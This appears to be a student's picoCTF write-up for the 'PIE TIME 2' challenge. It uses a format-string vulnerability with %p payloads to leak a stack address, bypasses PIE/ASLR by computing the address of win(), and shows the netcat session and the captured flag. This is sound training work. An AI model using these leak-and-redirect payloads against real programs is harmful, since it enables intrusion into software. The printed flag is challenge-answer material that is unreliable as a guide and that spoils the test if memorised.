# PIE TIME 2

**Category:** binary exploitation
**Difficulty:** Medium  
**Progress:** Solved

---

## Description

**Files:** `vuln (binary)`, `vuln.c`

```
Can you try to get the flag? I'm not revealing anything anymore!!
```
---

## Analysis + Info Dump

#### file + checksec + readelf
```
Arch:     ELF 64-bit LSB executable, x86-64
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RPATH:    No RPATH
RUNPATH:  No RUNPATH
FORTIFY:  NO (Fortified 0 / Fortifiable 2)
SYMBOLS:  81 (not stripped)
```


#### Info Dump

```
scanf("%lx", &val);
void (*foo)(void) = (void (*)())val;
```
-> really interesting
second line can be translated as foo is a pointer to a function that returns void and takes no arguments = pointer with the value val to a function with return type void that takes an unspecified number of arguments

together with the scan f this basically takes an input interprets it as hex and calls the function that sits at whatever adress that hex number is


0x000000000000136a (win()) - 0x00000000000012c7 (call_functions()) = A3 (163<sub>10</sub>)
-> this seems useless

clear is: we need to leak an adress so we can do the math and locate win() so we can input the win address to retrieve the flag

https://owasp.org/www-community/attacks/Format_string_attack seems like a good resource.
Also read through https://cs155.stanford.edu/papers/formatstring-1.2.pdf 
I also put my notes for these here: [Format String Attack](https://github.com/Sneeshah/notes/blob/main/binary_hacking/format_string_attack.md)




### Vulnerability
- Format String Vulnerabilit

<!--
### Stack Layout
```
┌──────────────────┐
│  buf[0..31]      │  +0
├──────────────────┤
│  padding         │  +32
├──────────────────┤
│  saved EBX       │  +36
├──────────────────┤
│  saved EBP       │  +40
├──────────────────┤
│  return address  │  +44
└──────────────────┘
```
return adress -> push ebp -> push ebx -> sub 0x24 (36<sub>10</sub>)
padding = 0x24 - 0x20 = 0x04 

---
-->
## Solution


### Step 1:

1. the problem is not the fgets() it is the printf(buffer) which does not use specifiers.
2. what I know is that we can input specifiers and use %x or %p to with our own padding to find out the address we currently are at. We need one address to then calculate the relative distance to the address of win(). We can not work with absolutes cause PIE (position independet code) changes the addresses every time we run the program.
3. we can use a padding like ABCDEFGH to find out when exactly our own input is overriden.

So first step should be to run our padded input with `%p` to look at the addresses. 

- gdb run
- disas call_functions

We need a breakpoint right after the function prints our input out again. So at call_functions+85

- b *call_functions+85

Now we input our pattern and `%p`'s

- ABCDEFGHIKLMNOP.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```
ABCDEFGHIKLMNOP.0x555555559311.0x7ffff7f927a0.0x7ffff7f927a0.0x55555555934a.(nil).0x1.0x7ffff7e356c9.0x4847464544434241.0x2e504f4e4d4c4b49.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e
```
this output looks good. `0x4847464544434241.0x2e504f4e4d4c4b49` 
```python
from pwn import *
>>> print(p64(0x4847464544434241))
b'ABCDEFGH'
>>> print(p64(0x2e504f4e4d4c4b49))
b'IKLMNOP.'
```
Looks like our padding. So we can trim the input to `ABCDEFGH.%p.%p.%p.%p.%p.%p.%p.%p` and now the last printed output is our `ABCDEFGH`
`ABCDEFGH.%8$p` is a bit cleaner. 

-Let's write down the adresses in gdb and find their (relative) offsets 
```
main:           0x0000555555555400
win:            0x000055555555536a
call_functions: 0x00005555555552c7
```
win - call_functions is A3 (<sub>163</sub>) as we already noted down earlier.<br>
main - win is 96 (<sub>150</sub>)

So my buffer starts printing itself at `%8$p` and since it is 64 bytes long I can take a look at anything starting from `%16$p`.

```
ABCDEFGH.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p.%21$p.%22$p.%23$p.%24$p.%25$p.%26$p.
```
returns 
```
ABCDEFGH.0x4847464544434241.(nil).0x5f69360869f8a700.0x7fffffffdd30.0x555555555441.0x7fffffffde48.0x7ffff7dd2f77.0x7ffff7fc6000.0x555555555400.%
```
and produces a segfault...
`ABCDEFGH.%8$p.%23$p` shouldn't produce one since we do not overwrite the 64 bytes of the buffer that fgets() writes to.
And we actually got the flag inside gdb. 
Confirmed it works without gdb and our selfmade flag so now we can actually connect to the challenge.

Unfortunately it did not work with the actual challenge. So back one square 
```
%21$p.%22$p.%23$p.%24$p.%25$p.%26$p.%27$p.%28$p.%29%p.%30$p.
```
finally revealed a useful output:
```
0x75c300d8f083.0x75c300f97620.0x7ffdc9745128.0x100000000.0x64710fcee400.0x64710fcee450.0x5a679c856ff59a16.0x64710fcee1c0.%p.(nil).
```
`0x64710fcee400.` looks similiar to our static address of main `0x0000555555555400`. ASLR keeps the last 12 Bits the same that is why this is our new main
### Step 2 — Exploit
```
nc rescued-float.picoctf.net 54459
Enter your name:%25$p.%26$p.%27$p.%28$p.%29%p.%30$p.%31$p.%32$p
0x645bea8d0400.0x645bea8d0450.0x71626f68810fbbe.0x645bea8d01c0.%p.(nil).(nil).0xf8ea656905d0fbbe
enter the address to jump to, ex => 0x12345: 645BEA8D036A 
```

### Step 3 — Capturing the flag

```
picoCTF{p13_5h0u1dn'7_134k_9d4030a3}
```



<!--
---
## Exploit

```python

```
-->

---

## Learnings

- String specifiers are complicated (STILL) 
- read up on ASLR Here https://picoctfsolutions.com/posts/aslr-pie-bypass-ctf
- These exploits need careful noting down and reading everything. Missing an address or being off by 1 costs so much time and nerves here
- Need to use pwntools so probably working through their tutorial next